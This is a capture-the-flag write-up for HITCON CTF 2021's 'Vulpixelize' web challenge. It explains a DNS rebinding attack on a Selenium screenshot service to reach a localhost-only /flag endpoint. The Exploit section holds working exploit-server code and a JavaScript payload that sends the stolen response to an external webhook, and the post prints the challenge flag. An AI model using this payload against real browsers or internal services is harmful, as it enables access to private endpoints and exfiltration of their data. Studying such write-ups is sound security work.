---
title: Vulpixelize - HITCON CTF 2021
date: 2021-12-05 21:24:04
author: Yadhu Krishna M
author_url: https://twitter.com/YadhuKrishna_
categories:
  - Web
tags:
  - DNS Rebinding
  - HITCONCTF
---

**tl;dr**

+ Use DNS Rebinding attack to read flag from `/flag` endpoint.

<!--more-->

**Challenge Points**: 232
**No. of solves**: 41
**Solved by**: [Yadhu Krishna M](https://twitter.com/YadhuKrishna_), [1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_)

## Challenge Description

Can you break it?

**Source Code:** [Here](https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2021/Vulpixelize)

## Analysis

We are given an application that generates a pixelized screenshot of a given webpage.

![](screenshot.png)

There is a flag endpoint that returns the flag only if the remote address is `127.0.0.1`. 

```python=
@app.route('/flag')
def flag():
    if request.remote_addr == '127.0.0.1':
        return message(FLAG)
    return message("allow only from local")
```

It is possible to get the pixelated screenshot of the flag by submitting http://localhost:8000/flag as the URL.

The application uses Selenium to visit the given URL to screenshot it. The screenshot is resized using PIL library.

```python
@app.route('/submit', methods=['GET'])
def submit():
    path = 'static/images/%s.png' % uuid.uuid4().hex
    url  = request.args.get('url')
    if url:
        # secrity check
        if not url.startswith('http://') and not url.startswith('https://'):
            return message(msg='malformed url')

        # access url
        try:
            driver.get(url)
            data = driver.get_screenshot_as_png()
        except common.exceptions.WebDriverException as e:
            return message(msg=str(e))

        # save result
        img = Image.open(io.BytesIO(data))
        img = img.resize((64,64), resample=Image.BILINEAR)
        img = img.resize((1920,1080), Image.NEAREST)
        img.save(path)
        
        return message(msg=path)
    else:
        return message(msg="url not found :(")
```

Upon examining the source code further, we find that the webpage that selenium has opened will be left unclosed. This means that it is possible to execute JavaScript for until the deployment expires. 


## Exploit

We use DNS rebinding attack to read the flag from localhost. DNS rebinding attack can be used to bypass Same-Origin policies implemented by the browser. 

Here, we use a DNS rebinding service, https://lock.cmpxchg8b.com/rebinder.html to switch between two IPs, one being the IP of the exploit server, and the other being `0.0.0.0`. The rebinder has a short TTL and it switches between these two IPs randomly. 

The exploit server contains the following code. 

```python=
# Exploit Server
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/flag")
def flag():
    return "noflag"

app.run(host="0.0.0.0", port=8000, debug=True)
```

```html=
<html>
    <script>
        const host = "http://9843a2a4.00000000.rbndr.us:8000"; 
        let count = 0;

        setInterval(function(){ 
            if (count != 100) {
                var req = new XMLHttpRequest();
                req.open('GET', `${host}/flag`, false);
                req.send(null);
                if(req.status == 200) 
                {
                    navigator.sendBeacon("https://webhook.site/<webhook_id>", req.responseText)
                }
                count ++; 
            }
        }, 20000);
    </script>
</html>
```

The exploit works in three steps:
1. The URL http://9843a2a4.00000000.rbndr.us:8000 is submitted to the application. The rebinder first resolves to IP address of the exploit server, and the JavaScript is loaded in the selenium browser.
2. The JS code continously makes XHR requests to `/flag`, and sends the result to the webhook URL. 
3. At a certain point of time, the rebinder switches the IP to 0.0.0.0. This causes an XHR request to be sent to http://0.0.0.0:8000/flag instead of the exploit server, bypassing SOP. This returns the actual flag to the webhook URL. 

## Flag

```
hitcon{1-1-4-1-6-1-e-9-f-9-4-c-7-3-e-4-9-7-a-7-5-d-4-6-6-c-6-3-3-7-f-4}
```